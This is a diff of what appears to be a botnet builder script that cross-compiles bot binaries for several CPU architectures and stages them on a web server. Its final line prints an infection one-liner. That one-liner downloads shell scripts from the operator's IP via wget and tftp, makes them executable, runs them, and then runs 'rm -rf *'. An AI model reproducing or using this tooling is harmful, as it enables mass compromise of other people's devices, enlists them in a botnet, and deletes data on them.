@@ -29,9 +29,9 @@ compileas = ["project01.mpsl",   #mpsl
              "project01.ppc",    #ppc   
              "project01.sparc" 
 
-getarch = ['http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',         			#downloading -> X86       
-           'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',        			#downloading -> ppc       
-           'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2']          			#downloading -> sparc   
+getarch = ['http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2',         			#downloading -> X86 roots      
+           'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2',        			#downloading -> ppc powerpc      
+           'http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2']          			#downloading -> sparc sparcs  
              
 
 ccs = ["cross-compiler-x86_64",
@@ -147,4 +147,5 @@ run("ulimit -n 999999; ulimit -u 999999; ulimit -e 999999")
 run('echo -e "ulimit -n 99999" >> ~/.bashrc')
 run('rm -rf cross-compiler-i586 cross-compiler-i686 cross-compiler-m68k cross-compiler-powerpc cross-compiler-powerpc-440fp cross-compiler-sh4 cross-compiler-sparc cross-compiler-x86_64')
 print("\x1b check directory /var/www/html to make sure binarys created")
+
 print("PAYLOAD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/project01.sh; chmod 777 project01.sh; sh project01.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *\x1b[0m")
